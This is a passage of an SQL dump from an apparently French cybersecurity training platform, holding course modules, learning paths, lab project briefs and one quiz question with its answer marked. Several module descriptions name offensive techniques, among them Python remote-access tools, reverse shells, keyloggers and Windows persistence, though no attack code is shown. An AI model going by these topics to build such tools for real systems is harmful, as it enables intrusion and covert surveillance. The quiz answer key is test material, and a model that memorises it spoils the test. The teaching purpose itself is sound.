Vous êtes mandaté en tant que consultant de sécurité indépendant par l''entreprise fictive **« NovaPay Financial Systems »** pour réaliser l''audit technique complet de sa nouvelle plateforme de micropaiements :

```
                                [ PERIMÈTRE AUDITÉ : NOVAPAY ]
                                              |
        +-------------------------------------+-------------------------------------+
        |                                                                           |
[ SURFACE EXTERNE ]                                                   [ APPLICATION BACKEND & BD ]
  - Domaine public : api.novapay.internal                               - API REST Python FastAPI
  - Pare-feu Linux (iptables / UFW)                                     - Base de données PostgreSQL
  - Services exposés : Ports 22, 80, 443, 8080                         - Microservice d''authentification JWT
```

---

## 2. Les 4 Phases Obligatoires du Projet Capstone

### Phase 1 : Reconnaissance & Cartographie de Surface (Volumes 1 à 5)
* Réaliser un inventaire précis des ports, démons et versions logicielles avec Nmap.
* Analyser la topologie réseau, identifier les interfaces exposées et vérifier la présence de pare-feux applicatifs (WAF).

### Phase 2 : Évaluation des Vulnérabilités & Exploitation Éthique (Volumes 6 à 9)
* Identifier et reproduire en laboratoire isolé une vulnérabilité critique de l''OWASP Top 10 (ex: injection SQL sur le module de facturation ou faille d''autorisation IDOR sur les transactions).
* Démontrer l''impact potentiel (preuve de concept - PoC) sans perturber la disponibilité des services.

### Phase 3 : Durcissement, FIM & Détection Blue Team (Volumes 10 et 11)
* Développer et injecter le correctif définitif en Python (requêtes préparées, validation d''entrées, algorithme de hachage salé PBKDF2 et comparaison en temps constant `compare_digest`).
* Configurer une règle Sigma dans le SIEM pour alerter immédiatement en cas de nouvelle tentative d''exploitation.

### Phase 4 : Rédaction du Rapport Exécutif Professionnel (Volume 12)
* Rédiger un rapport d''audit exhaustif comprenant :
  1. Un **Résumé Managérial (Executive Summary)** d''une page vulgarisant les risques pour la direction générale.
  2. Une **Matrice des Vulnérabilités** avec cotation standardisée **CVSS 3.1** (Score de base, vecteur temporel et environnemental).
  3. Des **Fiches Techniques Détaillées** pour chaque vulnérabilité (Description, Preuve de Concept, Impact métier, Solution technique éprouvée).

---

## 3. Critères d''Évaluation & Grille de Notation RayLab

| Domaine Évalué | Pondération | Attentes Clés |
| :--- | :--- | :--- |
| **Rigueur Déontologique & Périmètre** | 20% | Respect absolu de l''ordre de mission, aucune action destructive. |
| **Maîtrise Technique & Code Python** | 30% | Qualité du code, typage PEP 484, gestion des exceptions, performance. |
| **Remédiation Défensive (Blue Team)** | 25% | Efficacité des contre-mesures, durcissement, règles de détection SIEM. |
| **Qualité du Rapport d''Audit** | 25% | Clarté de la cotation CVSS, pertinence des recommandations, professionnalisme. |

Ce livrable constituera la pièce maîtresse de votre **Portfolio GitHub** et de vos entretiens d''embauche pour des postes d''**Analyste SOC**, de **Pentesteur Junior** ou d''**Ingénieur DevSecOps**.
','interactive',2,60,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
CREATE TABLE modules (
    id TEXT PRIMARY KEY,
    course_id TEXT NOT NULL,
    title TEXT NOT NULL,
    description TEXT,
    position INTEGER NOT NULL CHECK (position >= 0),
    status TEXT NOT NULL DEFAULT 'draft'
        CHECK (status IN ('draft', 'published', 'archived')),
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    updated_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    UNIQUE (course_id, position),
    FOREIGN KEY (course_id) REFERENCES courses(id) ON DELETE CASCADE
);
INSERT INTO "modules" VALUES('m_vol1_1','c_vol1_foundations','Module 1 : Découvrir la Cybersécurité, Éthique & Légalité','Triade CIA, aspects juridiques (Art. 323-1), déontologie et gestion des risques.',1,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol1_2','c_vol1_foundations','Module 2 : Fondamentaux Matériels, OS & Laboratoire Isolé','Architecture processeur, mémoire, hyperviseurs et configuration VirtualBox.',2,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol2_1','c_vol2_linux_bash','Module 1 : Maîtrise du Terminal Linux & Gestion Système','Navigation, filtres grep/sed/awk, gestion de processus et permissions octales.',1,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol2_2','c_vol2_linux_bash','Module 2 : Scripting Bash & Automatisation d''Audit','Variables, conditions, boucles et développement du script d''audit du Projet 01.',2,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol3_1','c_vol3_python_core','Module 1 : Syntaxe Moderne, Typage PEP 484 & Collections','Typage statique, match/case, deque, Counter et structures de données.',1,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol3_2','c_vol3_python_core','Module 2 : POO Avancée, Dunder Methods & Architecture','Encapsulation, property, constructeurs, gestionnaires de contexte et SOLID.',2,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol4_1','c_vol4_networking','Module 1 : Architecture Réseau & Protocoles Fondamentaux','Modèles OSI (7 couches) et TCP/IP, encapsulation et adressage MAC/IP.',1,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol4_2','c_vol4_networking','Module 2 : Le Protocole TCP, Handshake & Routage IP','Poignée de main à 3 voies (SYN/ACK), drapeaux TCP, CIDR et NAT.',2,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol5_1','c_vol5_net_analysis','Module 1 : Capture de Trafic & Dissection Scapy','Wireshark, filtres BPF, tcpdump et forge de paquets en Python avec Scapy.',1,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol5_2','c_vol5_net_analysis','Module 2 : Attaques Man-in-the-Middle & Sécurité ARP','ARP Cache Poisoning, forward IP, interception et défenses Dynamic ARP Inspection.',2,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol6_1','c_vol6_web_sql','Module 1 : Architecture Web, Protocole HTTP & Sessions','Requêtes, réponses, verbes HTTP, codes d''état, en-têtes et cookies de session.',1,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol6_2','c_vol6_web_sql','Module 2 : Bases de Données SQL & Injections (SQLi)','Modélisation relationnelle, injections SQL (UNION, Blind) et requêtes préparées.',2,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol7_1','c_vol7_web_security','Module 1 : Le Top 10 OWASP en Pratique','Cross-Site Scripting (XSS), CSRF, failles d''autorisation IDOR et SSRF.',1,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol7_2','c_vol7_web_security','Module 2 : Authentification Robuste & Gestion de Jetons','Hachage salé PBKDF2, jetons JWT signés, OAuth 2.0 et anti-bruteforce (Projet 03).',2,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol8_1','c_vol8_pentest_tools','Module 1 : Reconnaissance Active & Outils de Pentest','Nmap avancé (-sS, -sV, NSE), Burp Suite Proxy/Repeater et Gobuster.',1,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol8_2','c_vol8_pentest_tools','Module 2 : Méthodologie CTF & Élévation de Privilèges','Challenges Boot2Root, recherche d''accès initial et scripts LinPEAS/WinPEAS.',2,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol9_1','c_vol9_python_rat','Module 1 : Sockets Purs, Architecture de RAT & Reverse Shells','Sockets TCP natifs, redirection de commandes subprocess et navigation de répertoires.',1,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol9_2','c_vol9_python_rat','Module 2 : Exfiltration Délimitée, Packaging & Persistance','Transfert par blocs de 2048 octets, keylogger pynput, PyInstaller et registre Windows.',2,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol10_1','c_vol10_crypto_cloud','Module 1 : Cryptographie Moderne & Protocole TLS 1.3','Chiffrement AES-GCM, paires asymétriques RSA-4096 / ECC et négociation TLS.',1,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol10_2','c_vol10_crypto_cloud','Module 2 : Sécurité des Architectures Cloud & RLS','Contrôle d''accès IAM, règles Row Level Security Supabase/Firebase et Projet 04.',2,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol11_1','c_vol11_blue_soc','Module 1 : Cycle DevSecOps & Durcissement Applicatif','Analyse statique SAST, composition logicielle SCA et remédiation du Projet 05.',1,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol11_2','c_vol11_blue_soc','Module 2 : Opérations Blue Team, SIEM & Gestion d''Incidents','Centralisation Syslog/EVTX, règles Sigma, File Integrity Monitoring et cycle PICERL (Projet 06).',2,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol12_1','c_vol12_forensics_cap','Module 1 : Digital Forensics & Rédaction de Rapport d''Audit','Chaîne de custody (RFC 3227), Volatility mémoire, cotation CVSS 3.1 et Projet 07.',1,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "modules" VALUES('m_vol12_2','c_vol12_forensics_cap','Module 2 : Le Capstone Final CyberPath 2026-2027','Évaluation intégrale de synthèse couvrant l''ensemble des compétences des 12 volumes.',2,'published','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
CREATE TABLE path_courses (
    learning_path_id TEXT NOT NULL,
    course_id TEXT NOT NULL,
    position INTEGER NOT NULL CHECK (position >= 0),
    is_required INTEGER NOT NULL DEFAULT 1 CHECK (is_required IN (0, 1)),
    PRIMARY KEY (learning_path_id, course_id),
    UNIQUE (learning_path_id, position),
    FOREIGN KEY (learning_path_id) REFERENCES learning_paths(id) ON DELETE CASCADE,
    FOREIGN KEY (course_id) REFERENCES courses(id) ON DELETE CASCADE
);
INSERT INTO "path_courses" VALUES('path_cyberpath_master','c_vol1_foundations',1,1);
INSERT INTO "path_courses" VALUES('path_cyberpath_master','c_vol2_linux_bash',2,1);
INSERT INTO "path_courses" VALUES('path_cyberpath_master','c_vol3_python_core',3,1);
INSERT INTO "path_courses" VALUES('path_cyberpath_master','c_vol4_networking',4,1);
INSERT INTO "path_courses" VALUES('path_cyberpath_master','c_vol5_net_analysis',5,1);
INSERT INTO "path_courses" VALUES('path_cyberpath_master','c_vol6_web_sql',6,1);
INSERT INTO "path_courses" VALUES('path_cyberpath_master','c_vol7_web_security',7,1);
INSERT INTO "path_courses" VALUES('path_cyberpath_master','c_vol8_pentest_tools',8,1);
INSERT INTO "path_courses" VALUES('path_cyberpath_master','c_vol9_python_rat',9,1);
INSERT INTO "path_courses" VALUES('path_cyberpath_master','c_vol10_crypto_cloud',10,1);
INSERT INTO "path_courses" VALUES('path_cyberpath_master','c_vol11_blue_soc',11,1);
INSERT INTO "path_courses" VALUES('path_cyberpath_master','c_vol12_forensics_cap',12,1);
INSERT INTO "path_courses" VALUES('path_python_mastery','c_vol3_python_core',1,1);
INSERT INTO "path_courses" VALUES('path_python_mastery','c_vol2_linux_bash',2,1);
INSERT INTO "path_courses" VALUES('path_python_mastery','c_vol9_python_rat',3,1);
INSERT INTO "path_courses" VALUES('path_ethical_hacking','c_vol4_networking',1,1);
INSERT INTO "path_courses" VALUES('path_ethical_hacking','c_vol5_net_analysis',2,1);
INSERT INTO "path_courses" VALUES('path_ethical_hacking','c_vol8_pentest_tools',3,1);
INSERT INTO "path_courses" VALUES('path_ethical_hacking','c_vol9_python_rat',4,1);
INSERT INTO "path_courses" VALUES('path_ethical_hacking','c_vol12_forensics_cap',5,1);
INSERT INTO "path_courses" VALUES('path_cyber_defense','c_vol1_foundations',1,1);
INSERT INTO "path_courses" VALUES('path_cyber_defense','c_vol6_web_sql',2,1);
INSERT INTO "path_courses" VALUES('path_cyber_defense','c_vol7_web_security',3,1);
INSERT INTO "path_courses" VALUES('path_cyber_defense','c_vol10_crypto_cloud',4,1);
INSERT INTO "path_courses" VALUES('path_cyber_defense','c_vol11_blue_soc',5,1);
INSERT INTO "path_courses" VALUES('path_sysnet_infra','c_vol2_linux_bash',1,1);
INSERT INTO "path_courses" VALUES('path_sysnet_infra','c_vol4_networking',2,1);
INSERT INTO "path_courses" VALUES('path_sysnet_infra','c_vol5_net_analysis',3,1);
INSERT INTO "path_courses" VALUES('path_sysnet_infra','c_vol11_blue_soc',4,1);
INSERT INTO "path_courses" VALUES('path_career_hub','c_vol1_foundations',1,1);
INSERT INTO "path_courses" VALUES('path_career_hub','c_vol8_pentest_tools',2,1);
INSERT INTO "path_courses" VALUES('path_career_hub','c_vol12_forensics_cap',3,1);
CREATE TABLE path_enrollments (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    learning_path_id TEXT NOT NULL,
    enrollment_type TEXT NOT NULL DEFAULT 'public'
        CHECK (enrollment_type IN ('public', 'personal')),
    status TEXT NOT NULL DEFAULT 'active'
        CHECK (status IN ('active', 'completed', 'paused', 'cancelled')),
    started_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    completed_at TEXT,
    UNIQUE (user_id, learning_path_id, enrollment_type),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (learning_path_id) REFERENCES learning_paths(id) ON DELETE CASCADE
);
INSERT INTO "path_enrollments" VALUES('enr_alex_cp','user_alex_learner','path_cyberpath_master','public','active','2026-10-01 09:00:00',NULL);
INSERT INTO "path_enrollments" VALUES('enr_alex_py','user_alex_learner','path_python_mastery','public','active','2026-10-05 14:00:00',NULL);
INSERT INTO "path_enrollments" VALUES('enr_founder_cp','user_founder_raylab','path_cyberpath_master','personal','active','2026-09-01 08:00:00',NULL);
CREATE TABLE project_bookmarks (
    user_id TEXT NOT NULL,
    project_id TEXT NOT NULL,
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    PRIMARY KEY (user_id, project_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
);
CREATE TABLE project_skills (
    project_id TEXT NOT NULL,
    skill_id TEXT NOT NULL,
    PRIMARY KEY (project_id, skill_id),
    FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE,
    FOREIGN KEY (skill_id) REFERENCES skills(id) ON DELETE CASCADE
);
CREATE TABLE project_submissions (
    id TEXT PRIMARY KEY,
    project_id TEXT NOT NULL,
    user_id TEXT NOT NULL,
    title TEXT,
    description TEXT,
    repository_url TEXT,
    demo_url TEXT,
    documentation_url TEXT,
    status TEXT NOT NULL DEFAULT 'in_progress'
        CHECK (status IN ('in_progress', 'completed', 'published')),
    visibility TEXT NOT NULL DEFAULT 'private'
        CHECK (visibility IN ('private', 'public', 'unlisted')),
    started_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    completed_at TEXT,
    updated_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE RESTRICT,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);
CREATE TABLE projects (
    id TEXT PRIMARY KEY,
    slug TEXT NOT NULL UNIQUE,
    title TEXT NOT NULL,
    summary TEXT NOT NULL,
    description_md TEXT NOT NULL,
    domain TEXT NOT NULL,
    difficulty TEXT NOT NULL DEFAULT 'beginner'
        CHECK (difficulty IN ('beginner', 'intermediate', 'advanced')),
    prerequisites_md TEXT,
    requirements_md TEXT,
    safety_notes_md TEXT,
    estimated_minutes INTEGER CHECK (estimated_minutes IS NULL OR estimated_minutes >= 0),
    status TEXT NOT NULL DEFAULT 'draft'
        CHECK (status IN ('draft', 'published', 'archived')),
    created_by TEXT,
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    updated_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL
);
INSERT INTO "projects" VALUES('proj_01_bash_audit','projet-01-script-administration-linux','PROJET 01 : Script d''Administration et d''Audit Système Linux','Développer un outil Bash modulaire qui audite les comptes à hauts privilèges, les binaires SUID dangereux et les permissions système selon les recommandations CIS Benchmarks.','# PROJET 01 : Script d''Administration & d''Audit Système Linux

## Contexte Opérationnel
En tant que jeune administrateur ou auditeur système, vous devez rapidement évaluer le niveau de durcissement d''un serveur Linux (Debian/Ubuntu) sans installer de dépendances lourdes tierces.

## Objectifs du Projet
1. Développer un script Bash autonome `audit_hardening.sh` respectant les règles `set -euo pipefail`.
2. Identifier les anomalies de sécurité critiques :
   * Comptes disposant de l''UID 0 en dehors de `root`.
   * Mots de passe vides dans `/etc/shadow`.
   * Binaires SUID/SGID non standards pouvant être exploités pour une élévation de privilèges (référence GTFOBins).
   * Permissions excessives en écriture publique (`chmod 777`) sur des dossiers système.
3. Générer un rapport d''audit formaté en Markdown et un résumé synthétique dans le terminal avec code couleur ANSI.
','Systems','beginner','Avoir validé le Volume 2 de CyberPath (Commandes Linux, Pipelines, Expressions rationnelles et Scripting Bash).','- Script écrit en Bash pur sans dépendance externe.
- Gestion des erreurs et messages clairs.
- Détection d''au moins 5 indicateurs de durcissement.
- Code commenté et documenté dans un README.md avec instructions de lancement.','Le script doit être exécuté en lecture seule : aucune modification de configuration ne doit être effectuée sans confirmation explicite de l''utilisateur.',360,'published','user_founder_raylab','2026-11-04T20:51:45.838Z','2026-11-04T20:51:45.838Z');
INSERT INTO "projects" VALUES('proj_02_python_toolkit','projet-02-python-security-toolkit','PROJET 02 : Python Security Toolkit & Scanner Réseau Multi-threads','Concevoir une boîte à outils en Python moderne intégrant un scanner de ports TCP asynchrone non-bloquant, un extracteur de bannières et un calculateur d''empreintes de fichiers.','# PROJET 02 : Python Security Toolkit & Network Scanner

## Contexte Opérationnel
La plupart des outils du commerce sont trop volumineux pour des interventions rapides. Vous devez concevoir un ensemble d''utilitaires légers en Python 3 pour cartographier un périmètre réseau et analyser des fichiers suspects.

## Fonctionnalités Requises
1. **Module Scanner TCP :** Balayage rapide de plages de ports à l''aide de threads (`concurrent.futures.ThreadPoolExecutor`) ou `asyncio`, avec détection de bannières applicatives.
2. **Module Hashing & Intégrité :** Calcul simultané d''empreintes MD5, SHA-1 et SHA-256 sur des fichiers suspects avec détection de collisions potentielles.
3. **Interface CLI Ergonomique :** Utilisation du module standard `argparse` pour permettre l''exécution en ligne de commande avec drapeaux (`--target`, `--ports`, `--threads`, `--output`).
','Programming','intermediate','Validation du Volume 3 de CyberPath et des parties I à VI du Manuel Complet de Python (POO, Concurrence, Fichiers, Exceptions).','- Typage PEP 484 complet.
- Architecture modulaire orientée objet.
- Tests unitaires `unittest` ou `pytest` couvrant au moins 80% du code.
- Gestion propre des interruptions clavier (Ctrl+C).','Ne scannez que des adresses autorisées au sein de votre laboratoire local (127.0.0.1 ou sous-réseau Host-Only). Le balayage non autorisé de cibles externes est strictement prohibé.',480,'published','user_founder_raylab','2026-11-04T20:51:45.838Z','2026-11-04T20:51:45.838Z');
INSERT INTO "projects" VALUES('proj_03_secure_auth','projet-03-authentification-securisee','PROJET 03 : Système d''Authentification Sécurisé (PBKDF2 & JWT)','Construire un microservice d''authentification complet résistant aux attaques par brute-force, avec dérivation de clé étirée, jetons JWT sécurisés et limitation de débit.','# PROJET 03 : Système d''Authentification Sécurisé & Anti-Bruteforce

## Contexte Opérationnel
L''authentification est le premier rempart protégeant les données des utilisateurs. Une implémentation naïve (mots de passe en clair, MD5 sans sel, jetons sans signature) expose l''application à des fuites catastrophiques.

## Livrables Techniques
1. **Stockage Cryptographique :** Dérivation de clés avec **PBKDF2-HMAC-SHA256** avec sel aléatoire CSPRNG (`os.urandom(16)`) et 600 000 itérations recommandées par l''OWASP.
2. **Vérification Temporelle Constante :** Utilisation obligatoire de `secrets.compare_digest()` pour neutraliser les attaques par canaux auxiliaires temporels.
3. **Limitation de Débit (Rate Limiting) :** Verrouillage temporaire d''un compte ou temporisation exponentielle après 5 tentatives infructueuses consécutives.
4. **Gestion de Sessions JWT :** Émission de jetons signés avec algorithme asymétrique RS256 ou HMAC-SHA256 et date d''expiration stricte.
','Web','intermediate','Volume 6 et 7 de CyberPath (HTTP, Cryptographie appliquée, OWASP Top 10).','- Backend réalisé en Python (FastAPI ou Flask).
- Base de données SQLite ou PostgreSQL avec requêtes préparées.
- Aucun mot de passe stocké en clair.
- Suite de tests d''intrusion automatisés validant la résistance au bruteforce.','N''utilisez jamais d''algorithmes dépréciés tels que MD5 ou SHA-1 pour le stockage des mots de passe.',540,'published','user_founder_raylab','2026-11-04T20:51:45.838Z','2026-11-04T20:51:45.838Z');
INSERT INTO "projects" VALUES('proj_04_cloud_crypto','projet-04-audit-cloud-crypto','PROJET 04 : Audit Cryptographique Hybride & Évaluation Cloud','Mettre en œuvre un coffre-fort de données chiffrées en AES-256-GCM / RSA-4096 et auditer les règles de sécurité Row Level Security (RLS) d''une architecture Cloud moderne.','# PROJET 04 : Chiffrement Hybride & Audit Cloud

## Contexte Opérationnel
Les entreprises déportent massivement leurs données vers le Cloud (Supabase, Firebase, AWS S3). Cependant, une mauvaise politique d''accès ou l''absence de chiffrement de bout en bout entraîne des fuites de données massives.

## Missions du Projet
1. **Coffre-Fort Numérique :** Implémenter un système de chiffrement d''enveloppe (Envelope Encryption) : un fichier volumineux est chiffré localement avec une clé symétrique AES-256-GCM éphémère, laquelle est ensuite chiffrée avec la clé publique RSA-4096 du destinataire.
2. **Audit de Règles Cloud :** Examiner les politiques d''accès aux bases de données (Supabase Postgres RLS ou Firebase Security Rules) pour détecter les failles d''exposition publique involontaire (`auth.uid() IS NULL`).
','Cybersecurity','intermediate','Volume 7 et 10 de CyberPath (Cryptographie moderne, Modèles Cloud).','- Code Python utilisant la bibliothèque `cryptography` officielle.
- Rapport d''audit de sécurité des règles Cloud avec matrice de remédiation.
- Validation de l''intégrité des données à l''aide des tags d''authentification GCM.','Veillez à protéger rigoureusement vos clés privées : ne les commitez jamais sur des dépôts GitHub publics.',480,'published','user_founder_raylab','2026-11-04T20:51:45.838Z','2026-11-04T20:51:45.838Z');
INSERT INTO "projects" VALUES('proj_05_app_hardening','projet-05-durcissement-application-owasp','PROJET 05 : Transformation & Durcissement d''une Application Vulnérable','Recevoir le code source d''une application criblée de failles OWASP Top 10 (SQLi, XSS, CSRF, IDOR), documenter les vulnérabilités et injecter les correctifs définitifs.','# PROJET 05 : Durcissement Applicatif & Remédiation OWASP

## Contexte Opérationnel
Le rôle d''un ingénieur sécurité ou DevSecOps ne se limite pas à trouver des failles : il doit être capable d''accompagner les développeurs dans l''écriture de correctifs robustes.

## Déroulement du Laboratoire
1. Vous recevez le code source d''une application de gestion d''utilisateurs contenant volontairement :
   * Une injection SQL sur le module de recherche.
   * Une faille XSS stockée dans le profil utilisateur.
   * Une faille IDOR permettant de consulter les messages privés d''autrui.
   * Une absence d''en-têtes HTTP de sécurité (CSP, HSTS).
2. Pour chaque faille :
   * Rédiger une preuve de concept (PoC) documentée.
   * Remplacer le code vulnérable par du code durci (requêtes préparées, échappement contextuel, vérification d''autorisation RBAC).
   * Valider que l''exploitation échoue désormais systématiquement.
','Web','intermediate','Volumes 6, 7 et 8 de CyberPath.','- Rapport de correction sous format Markdown avant/après.
- Code entièrement corrigé et testé.
- Configuration d''en-têtes de sécurité stricts (Content-Security-Policy).','Les tests doivent être conduits exclusivement au sein du conteneur de laboratoire local fourni.',540,'published','user_founder_raylab','2026-11-04T20:51:45.838Z','2026-11-04T20:51:45.838Z');
INSERT INTO "projects" VALUES('proj_06_soc_investigation','projet-06-investigation-incident-soc','PROJET 06 : Détecteur d''Incidents SOC & Analyseur SIEM Automatisé','Concevoir un mini-moteur de corrélation SIEM en Python qui ingère des journaux d''accès bruts, détecte les attaques en temps réel et génère des alertes selon le cycle PICERL.','# PROJET 06 : Détecteur d''Incidents SOC & SIEM

## Contexte Opérationnel
Les équipes de détection font face à un déluge de données. L''automatisation du parsing et de la corrélation d''événements est le cœur de métier d''un analyste SOC L2.

## Spécifications Logicielles
1. **Ingestion Multi-Sources :** Lecture en flux de fichiers de logs Apache/Nginx (format Combined Log Format) et Syslog Linux.
2. **Moteur de Détection par Expressions Rationnelles :** Identification automatique de signatures d''injections SQL, tentatives de traversée de répertoires (`/etc/passwd`), exécution de commandes et scans d''outils automatisés (Sqlmap, Nikto).
3. **Corrélation Temporelle :** Détection de rafales d''échecs de connexion (Brute-force) : plus de 10 codes HTTP 401 sur la même IP en moins de 60 secondes.
4. **Génération d''Alertes :** Notification horodatée avec niveau de sévérité (CRITICAL, HIGH, MEDIUM), adresse IP source, et recommandation d''action immédiate.
','Cybersecurity','advanced','Volumes 8 et 11 de CyberPath (Surveillance Blue Team, Regex, SIEM).','- Script Python orienté objet performant.
- Prise en charge d''au moins 4 règles de détection distinctes.
- Sortie formatée JSON pour intégration dans un SIEM moderne.
- Document de modélisation de réponse à incident selon le standard PICERL.','Manipulez les journaux d''attaques avec précaution pour éviter toute exécution accidentelle de commandes via injection de terminal.',600,'published','user_founder_raylab','2026-11-04T20:51:45.838Z','2026-11-04T20:51:45.838Z');
INSERT INTO "projects" VALUES('proj_07_pentest_pro','projet-07-pentest-complet-rapport-professionnel','PROJET 07 : Pentest Complet en Laboratoire & Rapport d''Audit Exécutif','Réalisation d''un test d''intrusion complet de bout en bout sur une cible de laboratoire isolée et rédaction d''un rapport d''audit exécutif coté au standard CVSS 3.1.','# PROJET 07 : Pentest Complet & Rapport d''Audit Professionnel

## Contexte Opérationnel
Le test d''intrusion ne se termine pas lorsqu''on obtient les droits administrateurs (`root` ou `SYSTEM`). La valeur ajoutée d''un auditeur de sécurité réside dans la qualité, la clarté et la pertinence de son rapport d''audit remis aux dirigeants et aux équipes techniques.

## Déroulement de l''Audit
1. **Phase de Cadrage :** Formalisation de l''ordre de mission (Rules of Engagement) et validation du périmètre.
2. **Reconnaissance & Énumération :** Cartographie complète des ports et services ouverts via Nmap.
3. **Analyse de Vulnérabilités & Exploitation :** Identification d''un point d''entrée, obtention d''un accès initial (Reverse Shell) et élévation de privilèges locale (PrivEsc).
4. **Rédaction du Rapport d''Audit Exécutif :**
   * Résumé managérial vulgarisé pour les décideurs.
   * Matrice des risques et tableau récapitulatif avec cotations CVSS 3.1 officielles.
   * Fiches techniques détaillées avec captures d''écran, preuves de concept et plans d''action correctifs hiérarchisés.
','Cybersecurity','advanced','Avoir complété l''intégralité des Volumes 1 à 12 de CyberPath 2026-2027.','- Rapport d''audit de 15 à 25 pages au format PDF professionnel (rédigé en Markdown puis compilé).
- Respect strict de la cotation CVSS 3.1 pour chaque vulnérabilité identifiée.
- Recommandations techniques réalistes et budgétées.
- Code des scripts d''exploitation annexé et commenté.','L''audit doit être mené exclusivement sur la machine virtuelle de laboratoire dédiée mise à disposition dans le cadre de ce projet.',720,'published','user_founder_raylab','2026-11-04T20:51:45.838Z','2026-11-04T20:51:45.838Z');
CREATE TABLE quiz_attempts (
    id TEXT PRIMARY KEY,
    quiz_id TEXT NOT NULL,
    user_id TEXT NOT NULL,
    answers_json TEXT NOT NULL DEFAULT '{}',
    score REAL CHECK (score IS NULL OR (score >= 0 AND score <= 100)),
    passed INTEGER CHECK (passed IS NULL OR passed IN (0, 1)),
    started_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    submitted_at TEXT,
    FOREIGN KEY (quiz_id) REFERENCES quizzes(id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);
CREATE TABLE quiz_questions (
    id TEXT PRIMARY KEY,
    quiz_id TEXT NOT NULL,
    question_type TEXT NOT NULL
        CHECK (question_type IN ('single_choice', 'multiple_choice', 'true_false', 'short_answer')),
    prompt_md TEXT NOT NULL,
    explanation_md TEXT,
    options_json TEXT,
    answer_key_json TEXT,
    points REAL NOT NULL DEFAULT 1 CHECK (points >= 0),
    position INTEGER NOT NULL CHECK (position >= 0),
    UNIQUE (quiz_id, position),
    FOREIGN KEY (quiz_id) REFERENCES quizzes(id) ON DELETE CASCADE
);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol1_ch1_1','quiz_les_cp_vol1_ch1','multiple_choice','Quel pilier de la sécurité de l''information est violé lorsqu''un attaquant altère subrepticement les soldes bancaires dans une base de données ?','La modification non autorisée ou la falsification de données constitue une violation directe du pilier d''Intégrité.','[{"text": "L''Int\u00e9grit\u00e9", "is_correct": true}, {"text": "La Confidentialit\u00e9", "is_correct": false}, {"text": "La Disponibilit\u00e9", "is_correct": false}, {"text": "La Non-r\u00e9pudiation", "is_correct": false}]',NULL,10.0,1);
